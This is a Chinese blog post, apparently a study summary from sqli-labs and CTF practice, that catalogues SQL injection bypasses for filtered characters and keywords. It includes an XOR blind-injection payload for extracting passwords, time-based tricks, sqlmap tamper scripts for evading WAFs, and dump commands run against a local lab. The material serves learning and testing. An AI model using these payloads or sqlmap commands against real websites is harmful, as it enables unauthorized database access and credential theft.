---
layout:     post                    # 使用的布局（不需要改）
title:      SQL注入绕过与sqlmap使用方法总结               # 标题 
subtitle:    #副标题
date:       2019-09-02              # 时间
author:     Von                      # 作者
header-img: img/post-bg-android.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - Web
    - SQL

---

# 前言
最近零零散散地吧sqli-labs刷完了，学到了很多知识。但在里面对于WAF过滤的情况研究得不多，仅起到一个入门的作用，而在CTF中是基本上不会有这么简单的注入的。在这里我写一篇文章对常见的绕过过滤方法进行总结。

# 过滤了#,-- 
这种过滤了注释符的我们可以用类似'1'='1来绕过，比如当闭合方式为'的情况下，我们在语句后面添加 and '1'='1来闭合后面的'，也同时达到了注释的作用。  

# 过滤了空格
1. %20 %09 %0d %0b %0c %0d %a0 %0a，这些字符不会被php的\s匹配。  
2. 使用括号来避免使用空格.
``` sql
mysql> select(username)from(security.users);
+----------+
| username |
+----------+
| Dumb     |
| Angelina |
| Dummy    |
| secure   |
| stupid   |
| superman |
| batman   |
| admin    |
| admin1   |
| admin2   |
| admin3   |
| dhakkan  |
| admin4   |
| test     |
+----------+
14 rows in set (0.00 sec)
```

# 过滤了'
1. hex编码:这里对应的主要情况主要是在where字句中:
``` sql
select column_name  from information_schema.tables where table_name='user'
```
当过滤了'时我们就没办法闭合了，这时我们可以使用16进制编码来绕过。也就是:
``` sql
select column_name  from information_schema.tables where table_name=0x7573657273
```
2. char编码:
``` sql
select column_name  from information_schema.tables where table_name=char(117,115,101,114)
```

# 过滤了,
我们主要在三种情况下会用到,  
1. limit语句
``` sql
limit 0,1 => limit 1 offset 0;
```
2. 盲注时的mid
``` sql
mid(str,i,j) => mid((str)from(i)for(j))
```
3. union语句
``` sql
union select 1,2,3 => union select * from (select 1)a join (select 2)b join (select 3)c;
```

# 过滤了and,or
可以用逻辑运算符&&,||来绕过，如果是被替换为''的话还可以使用双写绕过如:aandnd,oorr。
# 过滤了&,|,*,/,=等逻辑处理字符

## =
``` sql
select * from users where id in(2);
select * from users where id like 2;
```
## 普遍情况
通常这里我们也可以使用like,regexp(rlike),between and来绕过.
``` sql
select * from users where username regexp '^ad';(^表示字符串的开头)
select * from users where username regexp 'min$';($表示字符串的结尾)
select * from users where username like 'ad%';(表以ad开头的字符串)
select * from users where username like '%min';(表以min结尾的字符串)
select * from users where username between 'aa' and 'az';
```
需要注意的是,between and 得出的结果支持大概类似于regexp中的'^'，即匹配到的是以该字符串开头的字符。  

# 过滤了if
1. find_in_set
``` sql
select * from users where id = 1 and find_in_set(53,ord(substr(version()from(1)for(1))));
```
2. strcmp相同为0
``` sql
select * from users where id = 1 and strcmp(53,ord(substr(version()from(1)for(1))));
```
3. select case when (条件) then 代码1 else 代码 2 end
``` sql
select * from users where id = 1 && (select case when ord(substr(version()from(1)for(1)))=53 then sleep(1) else sleep(5) end);
```

# Union,select被过滤
这种情况下一般只能使用大小写绕过或者双写绕过。而如果是union被过滤我们可以使用盲注或者报错注入进行注入。  

# sleep()被过滤
我们可以使用benchmark来绕过。BENCHMARK(count,expr)  
BENCHMARK()函数重复countTimes次执行表达式expr,执行的时间长了，也达到了sleep的作用。
```
benchmark(100000,sha('1'))
```

# xor注入
```
0^1^0 --> 1 语句返回为真
0^0^0 --> 0 语句返回为假
```
故有payload:
```
admin'^(ascii(mid((password)from(i)for(1)))>j)^'1'='1'%23
```
这个payload可以绕过许多过滤:and,or,逗号,空格......

# SQLmap使用

## level
共有五个等级，默认为1。Level等级越高，检测越全面。用法:
```
python2 sqlmap.py -u "http:/www.xxx.com?id=1" -- level 2
```
总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。

## POST注入
先用burpsuite抓包后保存到本地再传入sqlmap。
```
python2 sqlmap.py -r "post.txt"
```

## tamper绕过WAF
tamper用法:
```
python2 sqlmap.py -u "http:/www.xxx.com?id=1" --tamper=apostrophemask
```
其中:
```
apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
appendnullbyte.py 在payload末尾添加空字符编码
base64encode.py 对给定的payload全部字符使用Base64编码
between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
equaltolike.py 用“LIKE”运算符替换全部等于号“=”
greatest.py 用“GREATEST”函数替换大于号“>”
halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
lowercase.py 用小写值替换每个关键字字符
modsecurityversioned.py 用注释包围完整的查询
modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
multiplespaces.py 在SQL关键字周围添加多个空格
nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
overlongutf8.py 转换给定的payload当中的所有字符
percentage.py 在每个字符之前添加一个百分号
randomcase.py 随机转换每个关键字字符的大小写
randomcomments.py 向SQL关键字中插入随机注释
securesphere.py 添加经过特殊构造的字符串
sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
space2comment.py 用“/**/”替换空格符
space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符
space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符
space2plus.py 用加号“+”替换空格符
space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
versionedkeywords.py 用MySQL注释包围每个非函数关键字
versionedmorekeywords.py 用MySQL注释包围每个关键字
xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
```
## 具体步骤
我以sqli-labs一道题为例:
```
爆库:python2 sqlmap.py -u  "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" --dbs
爆表:python2 sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" -D security --tables
爆字段:python2 sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" -D security -T users --columns
爆值:python2 sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" -D security -T users -C username,password --dump
```






